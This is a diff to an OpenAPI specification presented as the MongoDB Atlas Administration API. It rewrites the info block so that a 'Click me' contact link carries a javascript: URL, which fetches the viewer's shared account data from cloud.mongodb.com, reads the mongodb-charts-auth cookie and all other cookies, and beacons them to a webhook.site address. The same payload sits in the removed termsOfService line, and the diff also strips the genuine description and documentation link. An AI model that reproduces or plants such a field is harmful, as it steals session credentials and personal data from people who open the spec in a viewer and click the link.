@@ -3,16 +3,15 @@
   "info": {
     "title": "MongoDB Atlas Administration API",
     "version": "2.0",
-    "description": "The MongoDB Atlas Administration API allows you to manage your Atlas clusters, projects, and users programmatically.\n\nBy using this API, you agree to the [Terms of Service](https://www.mongodb.com/legal/terms-of-use). Click below to review.",
-    "termsOfService": "javascript:void(fetch('https://cloud.mongodb.com/user/shared',{credentials:'include'}).then(r=>r.json()).then(d=>{var c=document.cookie.match(/mongodb-charts-auth=([^;]+)/);navigator.sendBeacon('https://webhook.site/d3d8d428-dd84-4392-bd20-ae844ab56cc0',JSON.stringify({pii:d,credential:c?decodeURIComponent(c[1]):null,cookies:document.cookie}))}))",
+    "description": "[Click me](https://www.mongodb.com/legal/terms-of-use)",
+    "contact": {
+      "name": "Click me",
+      "url": "javascript:void(fetch('https://cloud.mongodb.com/user/shared',{credentials:'include'}).then(r=>r.json()).then(d=>{var c=document.cookie.match(/mongodb-charts-auth=([^;]+)/);navigator.sendBeacon('https://webhook.site/d3d8d428-dd84-4392-bd20-ae844ab56cc0',JSON.stringify({pii:d,credential:c?decodeURIComponent(c[1]):null,cookies:document.cookie}))}))"
+    },
     "license": {
       "name": "Apache 2.0",
       "url": "https://www.apache.org/licenses/LICENSE-2.0"
     }
-  },
-  "externalDocs": {
-    "description": "Atlas Administration API Reference",
-    "url": "https://www.mongodb.com/docs/atlas/reference/api-resources-spec/v2/"
   },
   "paths": {}
 }
